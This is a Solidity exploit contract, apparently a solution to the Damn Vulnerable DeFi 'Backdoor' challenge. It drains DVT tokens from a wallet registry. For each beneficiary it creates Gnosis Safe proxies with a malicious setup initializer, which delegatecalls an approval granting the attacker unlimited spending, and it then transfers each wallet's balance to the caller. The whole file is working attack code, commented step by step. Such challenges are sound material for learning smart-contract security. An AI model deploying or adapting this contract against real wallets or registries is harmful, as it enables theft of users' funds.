// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackRegistry {
    IGnosisSafeProxyFactory private proxyFactory;
    address private gnosisSafeSingleton;
    address private walletRegistry;
    IERC20 private DVT;

    constructor(
        address _proxyFactory,
        address _gnosisSafeSingleton,
        address _walletRegistry,
        address _DVT
    ) {
        proxyFactory = IGnosisSafeProxyFactory(_proxyFactory);
        gnosisSafeSingleton = _gnosisSafeSingleton;
        walletRegistry = _walletRegistry;
        DVT = IERC20(_DVT);
    }

    /**
    Called by Gnosisproxy wallet during setup,
    approves spender to transferFrom max possible tokens
     */
    function approveDVT(address _spender) external {
        DVT.approve(_spender, type(uint256).max);
    }

    function attack(address[] memory _beneficiaries) external {
        uint256 len = _beneficiaries.length;
        for (uint256 i = 0; i < len; i++) {
            //Setup owners array
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = _beneficiaries[i];

            //Setup initializer for proxy creation
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, //GnosisSafe::setup function signature
                //GnosisSafe::setup parameters
                walletOwners, //wallet owners
                1, //wallet threshold
                address(this), //address to which a delegateCall is made
                abi.encodeWithSelector( //data to use in the delegateCall
                    AttackRegistry.approveDVT.selector,
                    address(this)
                ),
                address(0), //fallback handler
                address(0), // payment token
                0, // payment
                address(0) //payment receiver
            );

            /**
            Create gnosis proxy with malicious initializer, 
            which approves this contract to transfer DVT
            from gnosis wallet
             */
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                gnosisSafeSingleton, //_singleton
                initializer, //initializer
                i, //saltNonce
                IProxyCreationCallback(walletRegistry) //callback
            );

            //Transfer tokens from victim
            DVT.transferFrom(
                address(proxy),
                msg.sender,
                DVT.balanceOf(address(proxy))
            );
        }
    }
}
